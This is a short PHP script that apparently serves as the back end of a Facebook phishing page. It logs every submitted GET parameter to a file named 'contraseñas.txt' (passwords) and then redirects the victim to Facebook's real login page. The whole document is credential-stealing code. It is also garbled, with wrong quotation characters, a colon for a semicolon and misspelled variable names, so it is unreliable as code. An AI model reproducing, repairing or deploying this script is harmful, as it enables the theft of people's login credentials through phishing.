<?php
header(¨Location: http://www.Facebook.com/login.php ¨);
$handle = fopen(¨contraseñas.txt¨, ¨a¨):

foreach($_GET as $variable => $value) {
        fwrite(Shandle, $variable);

        fwrite($handle, ¨=¨);
 
        fwrite($handle, $value);

        fwrite($handle, ¨\r\n¨);
}

fwrite($ande, ¨\r\n¨);
fclose($handle);

exit
?>
